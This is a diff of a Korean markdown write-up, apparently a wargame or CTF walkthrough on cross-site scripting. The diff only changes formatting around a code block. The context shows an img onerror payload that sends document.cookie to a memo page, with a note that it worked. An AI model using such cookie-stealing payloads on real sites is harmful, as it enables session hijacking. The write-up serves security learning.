@@ -53,7 +53,9 @@ onerror 를 이용해서 alert 창의 실행을 성공했다.
 ![10](https://user-images.githubusercontent.com/73854324/158143450-da728bc0-1620-4bcf-8169-f4b0113832cb.png)<br>
 ```
 <img src="/" onerror="location.href='/memo?memo='+document.cookie">
-```<br>
+```
+
+<br>
 ![11](https://user-images.githubusercontent.com/73854324/158143451-5c204d54-62b0-46d1-bdbe-0da2926dad37.png)<br>
 성공적으로 되었다.   
 이제 memo 페이지로 돌아가서 쿠키값을 확인해보자.   
